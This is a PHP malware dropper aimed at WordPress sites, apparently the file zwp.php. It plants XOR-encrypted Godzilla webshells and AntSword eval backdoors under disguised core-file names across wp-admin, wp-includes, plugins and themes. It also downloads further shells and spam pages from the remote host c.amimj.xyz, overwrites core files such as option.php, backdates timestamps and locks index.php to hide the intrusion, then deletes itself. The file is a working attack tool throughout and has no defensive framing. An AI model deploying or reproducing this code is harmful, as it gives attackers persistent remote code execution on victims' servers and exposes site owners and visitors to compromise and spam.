<?php

ini_set('memory_limit', '256M');
ini_set("display_errors", "Off");
header('Content-Type:text/html;charset=utf-8');

function suiji($length) {
    $str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890';
    $randStr = str_shuffle($str);
    $rands = substr($randStr, 0, $length);
    return $rands;
}

function is_https()
{
    if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return true;
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
        return true;
    } elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return true;
    }
    return false;
}
if (is_https()) {
    $http = 'https';
} else {
    $http = 'http';
}
$nameSet = array("admin", "index", "upgrade", "widgets", "menu", "edit", "credits", "about", "repair", "profile",
    "freedoms", "functions", "cache", "atomlib", "cron", "date", "embed", "feed", "load", "meta", "post", "rss", "vars", "user", "theme");
shuffle($nameSet);

$dir = dirname(__FILE__);
$file = scandir($dir);
$num = count($file);
$array = array();
for ($i = 0; $i < $num; $i++) {
    if (is_dir($file[$i]) == true) {
        array_push($array, $file[$i]);
    }
}
$num2 = count($array);
if ($num2 > 5) {
    $num2 = 5;
}
for ($i = 2; $i < $num2; $i++) {
    if (strpos($array[$i], '.') !== false) {
        $num2++;
    } else {
        @chmod($_SERVER['DOCUMENT_ROOT'] . "/" . $array[$i], 0755);
        $path = $_SERVER['DOCUMENT_ROOT'] . "/" . $array[$i] . "/language";
        if (!file_exists($path)) {
            mkdir($path, 0777, true);
        }
        shuffle($nameSet);
        $enfile = $nameSet[0] . '.php';
        $myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/" . $array[$i] . "/language/" . $enfile, "w");
        fwrite($myfile, '<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName="payload";
$key="5dfd5792cc336cbb";
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}');
        fclose($myfile);
        if (file_exists($_SERVER['DOCUMENT_ROOT'] . "/" . $array[$i] . "/language/" . $enfile)) {
            echo "http://" . $_SERVER['HTTP_HOST'] . "/" . $array[$i] . "/language/" . $enfile . "----godzilla<br/>";
        }

        shuffle($nameSet);
        $jpfile = $nameSet[0] . '.php';
        $myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/" . $array[$i] . "/language/" . $jpfile, "w");
        $url = "https://c.amimj.xyz/sma/shell/dama4.txt";
        $HTTP_Server = $url;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $HTTP_Server);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
        $res = curl_exec($ch);
        curl_close($ch);
        fwrite($myfile, $res);
        fclose($myfile);
        if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/" . $array[$i] . "/language/" . $jpfile)) {
            echo $http."://" . @$_SERVER['HTTP_HOST'] . "/" . $array[$i] . "/language/" . $jpfile . "----dama<BR/>";
        }
    }
}
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/sitemapsxml.php", "w");
fwrite($myfile, '<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName="payload";
$key="5dfd5792cc336cbb";
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
');
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/sitemapsxml.php", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/sitemapsxml.php")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/sitemapsxml.php----godzilla<BR/>";
}

$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/widgets.sys.php", "w");
$url = "https://c.amimj.xyz/sma/shell/dama4.txt";
$HTTP_Server = $url;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $HTTP_Server);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
$res = curl_exec($ch);
curl_close($ch);
fwrite($myfile, $res);
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/widgets.sys.php", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/widgets.sys.php")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/wp-admin/css/widgets.sys.php----dama<BR/>";
}
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/css/wp-embed-template-ie.min.php", "w");
$url = "https://c.amimj.xyz/sma/shell/dama4.txt";
$HTTP_Server = $url;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $HTTP_Server);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
$res = curl_exec($ch);
curl_close($ch);
fwrite($myfile, $res);
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/css/wp-embed-template-ie.min.php", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/wp-includes/css/wp-embed-template-ie.min.php")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/wp-includes/css/wp-embed-template-ie.min.php----dama<BR/>";
}
$password = suiji(6);
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/revisions-rtl.php", "w");
fwrite($myfile, '<?php class x{ public function ip(){ $c= $_POST["' . $password . '"]; return $c; } } $c = new x(); $b = $c -> ip(); eval($b);?>');
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/revisions-rtl.php", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/revisions-rtl.php")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/wp-admin/css/revisions-rtl.php----Antsword password:" . $password . "<br/>";
}
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/images/wpspin.php", "w");
fwrite($myfile, '<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName="payload";
$key="5dfd5792cc336cbb";
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
');
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/images/wpspin.php", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/wp-includes/images/wpspin.php")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/wp-includes/images/wpspin.php----godzilla<BR/>";
}
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-admin/js/privacy-tools.min.php", "w");
$url = "https://c.amimj.xyz/sma/shell/dama4.txt";
$HTTP_Server = $url;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $HTTP_Server);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
$res = curl_exec($ch);
curl_close($ch);
fwrite($myfile, $res);
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/wp-admin/js/privacy-tools.min.php", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/wp-admin/js/privacy-tools.min.php")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/wp-admin/js/privacy-tools.min.php----dama<BR/>";
}

$myfile = fopen($_SERVER['DOCUMENT_ROOT']."/sitexml.php","w");
$url = "https://c.amimj.xyz/sma/shell/dama4.txt";
$HTTP_Server = $url;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $HTTP_Server);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
$res = curl_exec($ch);
curl_close($ch);
fwrite($myfile, $res);
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/sitexml.php", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/sitexml.php")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/sitexml.php----dama<BR/>";
}


$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/js/imagesloaded.min.php", "w");
fwrite($myfile, '<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName="payload";
$key="5dfd5792cc336cbb";
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
');
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/js/imagesloaded.min.php", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/wp-includes/js/imagesloaded.min.php")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/wp-includes/js/imagesloaded.min.php----godzilla<BR/>";
}
$password = suiji(6);
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/css/editor.min.php", "w");
fwrite($myfile, '<?php class x{ public function ip(){ $c= $_POST["' . $password . '"]; return $c; } } $c = new x(); $b = $c -> ip(); eval($b);?>
');
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/css/editor.min.php", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/wp-includes/css/editor.min.php")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/wp-includes/css/editor.min.php----Antsword password:" . $password . "<br/>";
}
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-content/themes/system-wp.php", "w");
fwrite($myfile, '<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName="payload";
$key="5dfd5792cc336cbb";
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
');
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/wp-content/themes/system-wp.php", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/wp-content/themes/system-wp.php")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/wp-content/themes/system-wp.php----godzilla<BR/>";
}
$password = suiji(6);
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-content/plugins/system-wp.php", "w");
fwrite($myfile, '<?php class x{ public function ip(){ $c= $_POST["' . $password . '"]; return $c; } } $c = new x(); $b = $c -> ip(); eval($b);?>
');
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/wp-content/plugins/system-wp.php", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/wp-content/plugins/system-wp.php")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/wp-content/plugins/system-wp.php----Antsword password:" . $password . "<br/>";
}
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-content/plugins/wpsml-sys.php", "w");

$url = "https://c.amimj.xyz/sma/shell/dama4.txt";
$HTTP_Server = $url;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $HTTP_Server);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
$res = curl_exec($ch);
curl_close($ch);
fwrite($myfile, $res);
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/wp-content/plugins/wpsml-sys.php", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/wp-content/plugins/system-wp.php")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/wp-content/plugins/wpsml-sys.php----dama<BR/>";
}
if (function_exists('copy')) {
    $old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
    $myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/widgets/class-wp-widget-index.php", "w");
    $url = "https://c.amimj.xyz/sma/shell/wpindex.txt";
    $HTTP_Server = $url;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $HTTP_Server);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
    $res = curl_exec($ch);
    curl_close($ch);
    fwrite($myfile, $res);
    fclose($myfile);
    $myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/widgets/class-wp-widget-header.php", "w");
    $url = "https://c.amimj.xyz/sma/shell/wpheader.txt?v=1";
    $HTTP_Server = $url;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $HTTP_Server);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
    $res = curl_exec($ch);
    curl_close($ch);
    fwrite($myfile, $res);
    fclose($myfile);
    $myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/option.php", "w");
    $url = "https://c.amimj.xyz/sma/shell/wpoption.txt";
    $HTTP_Server = $url;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $HTTP_Server);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
    $res = curl_exec($ch);
    curl_close($ch);
    fwrite($myfile, $res);
    fclose($myfile);
    @touch($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/widgets/class-wp-widget-index.php", $old_time);
    @touch($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/widgets/class-wp-widget-header.php", $old_time);
    @touch($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/option.php", $old_time);
}
@chmod($_SERVER['DOCUMENT_ROOT'] . "/index.php", 0755);
@chmod($_SERVER['DOCUMENT_ROOT'] . "/wp-blog-header.php", 0755);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/widgets/class-wp-widget-index.php", "w");
$url = "https://c.amimj.xyz/sma/shell/wpindex.txt";
$HTTP_Server = $url;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $HTTP_Server);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
$res = curl_exec($ch);
curl_close($ch);
fwrite($myfile, $res);
fclose($myfile);
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/widgets/class-wp-widget-header.php", "w");
$url = "https://c.amimj.xyz/sma/shell/wpheader.txt?v=1";
$HTTP_Server = $url;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $HTTP_Server);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
$res = curl_exec($ch);
curl_close($ch);
fwrite($myfile, $res);
fclose($myfile);
@chmod($_SERVER['DOCUMENT_ROOT'] . "/index.php", 0444);
@chmod($_SERVER['DOCUMENT_ROOT'] . "/wp-blog-header.php", 0444);
@touch($_SERVER['DOCUMENT_ROOT'] . "/index.php", $old_time);
@touch($_SERVER['DOCUMENT_ROOT'] . "/wp-blog-header.php", $old_time);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/sitemapsxml.html", "w");
$url = "https://c.amimj.xyz/sma/shell/wl.txt";
$HTTP_Server = $url;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $HTTP_Server);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
$res = curl_exec($ch);
curl_close($ch);
fwrite($myfile, $res);
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/sitemapsxml.html", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/sitemapsxml.html")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/sitemapsxml.html<BR/>";
}
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
$myfile = fopen($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/sitemapxml.html", "w");
$url = "https://c.amimj.xyz/sma/shell/wl.txt";
$HTTP_Server = $url;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $HTTP_Server);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
$res = curl_exec($ch);
curl_close($ch);
fwrite($myfile, $res);
fclose($myfile);
$old_time = filemtime($_SERVER['DOCUMENT_ROOT'] . "/xmlrpc.php");
@touch($_SERVER['DOCUMENT_ROOT'] . "/wp-includes/sitemapxml.html", $old_time);
if (file_exists(@$_SERVER['DOCUMENT_ROOT'] . "/wp-includes/sitemapxml.html")) {
    echo $http."://" . @$_SERVER['HTTP_HOST'] . "/wp-includes/sitemapxml.html<BR/>";
}
unlink('zwp.php');
echo "<br/>";
echo "<br/>";
echo "<br/>";
echo "<br/>";
echo "<br/>";
echo "<br/>";
echo "<br/>";
echo "<br/>";
echo "<br/>";
echo "<br/>";
echo "<h1>记得查看是否有站群---------------------------------------------</h1>";
echo "<h1>Hãy nhớ xem liệu có bất kỳ nhóm nào không---------------------------------------------</h1>";
?>
